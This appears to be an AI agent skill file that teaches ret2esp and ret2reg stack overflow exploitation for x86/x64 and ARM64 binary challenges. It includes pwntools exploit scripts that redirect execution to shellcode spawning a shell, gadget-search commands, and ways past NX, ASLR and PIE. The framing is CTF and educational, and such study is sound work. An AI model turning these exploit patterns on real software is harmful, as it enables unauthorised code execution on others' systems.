---
name: ret2esp-ret2reg-exploitation
description: How to perform ret2esp and ret2reg exploitation techniques for binary exploitation. Use this skill whenever the user mentions stack pivoting, ret2esp, ret2reg, ret2eax, jmp esp, call esp, stack pointer manipulation, or needs to bypass NX/ASLR/PIE protections in binary exploitation challenges. This skill covers x86/x64 and ARM64 architectures.
---

# Ret2esp / Ret2reg Exploitation

This skill guides you through ret2esp and ret2reg exploitation techniques for binary exploitation challenges.

## When to Use This Skill

Use this skill when:
- You need to redirect execution to shellcode on the stack
- You're working with stack buffer overflow vulnerabilities
- You need to bypass NX protection by jumping to shellcode
- You're dealing with ASLR/PIE and need to find reliable gadgets
- You're working on ARM64 binaries and need ret2sp/ret2reg alternatives
- You need to pivot the stack pointer to execute shellcode

## Core Concepts

### Ret2esp

**Ret2esp** redirects execution to the stack pointer (ESP/RSP) by:
1. Overwriting EIP/RIP with the address of a `jmp esp` or `call esp` instruction
2. Placing shellcode immediately after the overwritten return address
3. When `ret` executes, ESP points to the shellcode

**Key advantage**: Shellcode is placed after EIP corruption, avoiding interference from push/pop operations during function execution.

### Ret2reg

**Ret2reg** uses register-based jumps when a register contains a useful address:
- **Ret2eax**: Use `call eax` or `jmp eax` when EAX holds the shellcode address
- **Ret2reg**: Any register containing an interesting address can be used
- Common scenario: Functions that return buffer addresses (e.g., `strcpy` returns destination address in EAX)

## Architecture-Specific Techniques

### x86/x64

#### Finding Gadgets

```bash
# Find jmp/call esp gadgets in binary
ROPgadget --binary ./vuln | grep -iE "(jmp|call) (esp|rsp)"

# Search in libc if ASLR is disabled
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep -iE "(jmp|call) (esp|rsp)"

# Alternative: use pwn search
from pwn import *
elf = ELF('./vuln')
next(elf.search(asm('jmp rsp')))
```

#### Stack Pivot When Space is Limited

If you lack space after overwriting RIP, use a stack pivot gadget:

```python
# Pivot gadget: sub rsp, 0x30; jmp rsp
# This moves RSP down and jumps to the new location

payload = b'A' * offset
payload += p64(pivot_gadget)  # e.g., sub rsp, 0x30; ret
payload += shellcode
```

#### Example Exploit (x64)

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# Find jmp rsp gadget
jmp_rsp = next(elf.search(asm('jmp rsp')))

# Craft payload
payload = b'A' * 120  # Offset to return address
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 10;
    jmp rsp;
''')

p.sendlineafter(b'RSP!\n', payload)
p.interactive()
```

### ARM64

#### Ret2sp Limitations

ARM64 **does not have** direct `jmp sp` instructions. You need to:
1. Find gadgets that move SP to a register
2. Then jump to that register

```bash
# Search for SP-to-register gadgets
for i in $(seq 1 30); do
    ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | \
    grep -Ei "[mov|add] x${i}, sp.* ; b[a-z]* x${i}( |$)"
done
```

#### Ret2reg on ARM64

Use `x0` (return value register) when functions return buffer addresses:

```bash
# Find branch-to-register gadgets
ROPgadget --binary ./binary | grep -Ei " b[a-z]* x[0-9][0-9]?"
```

#### Example Exploit (ARM64)

```python
from pwn import *

p = process('./ret2x0')
elf = context.binary = ELF('./ret2x0')

stack_offset = 72
shellcode = asm(shellcraft.sh())
br_x0 = p64(0x4006a0)  # Address of: br x0

# Shellcode first, then padding, then gadget
payload = shellcode + b"A" * (stack_offset - len(shellcode)) + br_x0

p.sendline(payload)
p.interactive()
```

## Protection Considerations

### NX (No-Execute)

- **Impact**: If stack is non-executable, ret2esp/ret2reg won't work directly
- **Bypass**: Use ROP chains to call `system()` or similar functions instead of shellcode

### ASLR (Address Space Layout Randomization)

- **Impact**: Makes finding reliable gadget addresses difficult
- **Bypass options**:
  - Leak addresses first (format string, info leak)
  - Use gadgets in the vulnerable binary itself (if PIE is disabled)
  - Brute force (only works with limited entropy)

### PIE (Position Independent Executable)

- **Impact**: Binary base address is randomized
- **Bypass options**:
  - Leak the binary base address
  - Use relative gadgets (rare)
  - Combine with ASLR bypass

## Common Patterns

### Pattern 1: Direct Ret2esp

```python
# When you have jmp esp and space after return address
payload = b'A' * offset
payload += p64(jmp_esp_gadget)
payload += shellcode
```

### Pattern 2: Stack Pivot + Ret2esp

```python
# When you need to move ESP/RSP first
payload = b'A' * offset
payload += p64(pivot_gadget)  # sub esp, 0x24; ret
payload += shellcode
```

### Pattern 3: Ret2reg with Function Return

```python
# When a function returns buffer address in a register
# Example: strcpy returns destination address in EAX
payload = b'A' * offset
payload += p64(jmp_eax_gadget)
# Shellcode is already in buffer, EAX points to it
```

### Pattern 4: ARM64 Ret2x0

```python
# When x0 contains buffer address after function return
payload = shellcode + b'A' * (offset - len(shellcode)) + p64(br_x0_gadget)
```

## Debugging Tips

### Verify Gadget Addresses

```python
# Check if gadget address is correct
from pwn import *
elf = ELF('./vuln')
print(hex(next(elf.search(asm('jmp rsp')))))

# Verify in GDB
gdb.attach(p)
gdb.execute(f'x/1i {gadget_addr}')
```

### Check Stack Layout

```python
# Use pattern to find exact offset
from pwn import *
context.binary = ELF('./vuln')
p = process()
pattern = cyclic(100)
p.sendline(pattern)

# In GDB, check RSP value
# Then: cyclic_find(rsp_value)
```

### Test Shellcode Placement

```python
# Verify shellcode is at expected location
from pwn import *
p = process('./vuln')
gdb.attach(p)

# After sending payload, check memory
# x/20i $rsp  # Should show your shellcode
```

## Quick Reference

| Technique | Architecture | Gadget Needed | Shellcode Location |
|-----------|--------------|---------------|-------------------|
| Ret2esp | x86/x64 | `jmp esp` / `call esp` | After return address |
| Ret2reg | x86/x64 | `jmp reg` / `call reg` | In register's address |
| Ret2sp | ARM64 | `mov xN, sp; br xN` | After pivot |
| Ret2x0 | ARM64 | `br x0` | In buffer (x0 points to it) |

## Next Steps

1. **Find the vulnerability**: Identify buffer overflow and offset
2. **Check protections**: Determine NX, ASLR, PIE status
3. **Find gadgets**: Use ROPgadget or pwn search
4. **Craft payload**: Follow patterns above
5. **Test and debug**: Use GDB to verify execution flow
6. **Iterate**: Adjust offsets and addresses as needed

## References

- [ir0nstone ret2esp notes](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)
- [ir0nstone ret2reg notes](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)
- [XCTF16 b0verflow writeup](https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html)
- [HackTricks ret2esp/ret2reg](https://book.hacktricks.xyz/pentesting/ret2esp-ret2reg)
